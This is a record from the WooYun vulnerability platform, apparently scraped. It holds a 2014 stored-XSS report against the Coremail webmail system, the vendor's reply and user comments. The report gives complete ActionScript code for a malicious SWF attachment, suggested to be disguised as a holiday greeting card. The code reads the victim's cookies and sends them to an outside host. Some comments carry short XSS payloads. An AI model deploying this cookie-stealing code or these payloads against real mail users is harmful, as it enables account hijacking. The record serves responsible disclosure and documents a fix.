{"id": 1862, "wybug_id": "wooyun-2014-062270", "wybug_title": "Coremail邮件系统存储型XSS之二", "wybug_corp": "Coremail盈世信息科技（北京）有限公司", "wybug_author": "mramydnei", "wybug_date": "2014-05-25 17:07", "wybug_open_date": "2014-08-23 17:08", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-23：\t细节向公众公开  简要描述： 设计错误导致可执行恶意JavaScript代码并窃取用户cookies 详细说明：  将特制的swf文件作为附件发送给受害者（这里可以选择在过节的时候下手，比如将文件名改称新年贺卡.swf）：swf文件的AS代码如下（将就着看吧，东拼西凑整出来的）：\n\n\npackage {\timport flash.external.ExternalInterface;\timport flash.display.Sprite;\timport flash.display.Sprite;    import flash.events.Event;    import flash.net.URLLoader;    import flash.net.URLRequest;    import flash.text.TextField;    import flash.text.TextFieldAutoSize;    import flash.xml.*;    import flash.events.IOErrorEvent;\timport flash.events.*;    import flash.net.*;\t/**\t * @author User\t */\t \tpublic class csrf extends Sprite {                private var loader:URLLoader;        public function csrf() {\t\t\tvar res:String = ExternalInterface.call(\"function(){return document.cookie;}\");            doGet(res);        }\t\t\t\tprivate function doGet(res:String):void{\t\t\tloader = new URLLoader();\t\t\tvar target:String = \"http://x55.me/geo.php?get=\"+res;            var request:URLRequest = new URLRequest(target);            try {                loader.load(request);            } catch (error:Error) {                sendDatatoJS(\"Error: \" + error.getStackTrace());            }\t\t}\t\t\t\tprivate function sendDatatoJS(data:String):void{            trace(data);\t\t\tExternalInterface.call(\"colsole.log\", data);\t\t}    }\t\t}\n受害者打开附件里的swf文件：\n\n一旦受害者打开附件里的swf文件，其cookies就会发送到攻击者的站点：\n\n   漏洞证明：  附上收到的cookies：\n\n   修复方案：  将swf文件加载到allowscriptaccess=\"never\"的object或embed标签里再执行   版权声明：转载请注明来源 mramydnei@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-05-26 11:47 厂商回复： 谢谢，在较新的版本中，除了部分格式的图片和PDF，其他类型的附件“打开”已被默认屏蔽。计划给相关老客户升级解决该问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-25 17:09 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  我擦。。。这算通用型么    \n     2014-05-25 18:38 |    \t\tJasonfcku \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 小白一只，求不社。)\t\t \n  我擦，你还连载啊。。@mramydnei    \n     2014-05-25 19:43 |    \t\t刘大硕 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  公布答案：<iframe src=\"javascript:alert('XSS')\"></iframe>    \n     2014-05-25 20:25 |    \t\tJasonfcku \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 小白一只，求不社。)\t\t \n  @刘大硕 。。。     \n     2014-05-25 20:58 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @刘大硕 让你猜10次 猜对了是哪儿的问题，我把这个洞的WB都给你    \n     2014-05-26 09:13 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  @mramydnei 洞主有coremail源代码吗    \n     2014-05-26 12:31 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @香草 没有    \n     2014-05-26 15:43 |    \t\tJasonfcku \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 小白一只，求不社。)\t\t \n  看厂商回复我猜是你写到文件里然后预览，随便猜猜，不知道对否    \n     2014-05-28 08:22 |    \t\t刘大硕 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  @mramydnei 我不要WB，你直接告诉我问题在哪如何？ 淫笑一下·······    \n     2014-05-30 08:19 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  根据厂商回复 目测漏洞出现在上传附件 然后在线浏览的功能    \n     2014-05-30 08:46 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  在线浏览，难道我我发现的那个。    \n     2014-05-30 13:57 |    \t\tBird \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:25        | Stay hungry. Stay foolish.)\t\t \n  洞主威武啊    \n     2014-05-30 14:31 |    \t\tskysheep \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 关注网络安全。)\t\t \n  其他类型的附件“打开”已被默认屏蔽。已公开    \n     2014-05-31 10:43 |    \t\tRedFree \t\t\t( 普通白帽子  |\t\t\t        Rank:180 漏洞数:40        | 每个系统都有它自身的弱点，无论是相对的还...)\t\t \n  有coremail源码，不精通xss怎么破～～    \n     2014-05-31 11:04 |    \t\tYwiSax \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:4        | 淡定。)\t\t \n  @RedFree 求发。。    \n     2014-05-31 11:05 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  @RedFree 求共享,找出漏洞rank分你一半。。。    \n     2014-05-31 11:12 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  @RedFree 求共享    \n     2014-05-31 17:34 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @RedFree 求共享    \n     2014-05-31 20:28 |    \t\tJasonfcku \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 小白一只，求不社。)\t\t \n  @RedFree 求共享    \n     2014-06-04 17:23 |    \t\tRedFree \t\t\t( 普通白帽子  |\t\t\t        Rank:180 漏洞数:40        | 每个系统都有它自身的弱点，无论是相对的还...)\t\t \n  @Jasonfcku @phith0n @香草 @香草 @Mody @YwiSax 官方都没有开源，我等还是不要泄露源码的好。使用Coremail多为政府和高校，一旦出现个通杀的getshell，那带来的后果是不堪设想滴。啊哈··我拥有的Coremail源码后端Java + mysql洞也不甚好挖~~ 只能说这么多了撒……    \n     2014-06-06 16:41 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  @mramydnei 我想我知道是哪儿了，在线浏览附件，文件名title=xxx\"on    \n     2014-06-17 06:24 |    \t\tShu Ding \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 路人)\t\t \n  @mramydnei 我试出来了...要不要在这儿说出来呢 = =    \n     2014-06-17 07:00 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @Shu Ding 那看你自己了     \n     2014-06-17 07:09 |    \t\tShu Ding \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 路人)\t\t \n  @mramydnei svg? = =    \n     2014-06-17 07:17 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @Shu Ding 和SVG不SVG没啥关系 不是富文本的XSS    \n     2014-07-05 23:52 |    \t\tBird \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:25        | Stay hungry. Stay foolish.)\t\t \n  苏大的？    \n     2015-06-30 13:38 |    \t\t糖剩七颗 \t\t\t( 普通白帽子  |\t\t\t        Rank:430 漏洞数:61        | 天涯何处无屌丝)\t\t \n  求geo.php源码    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}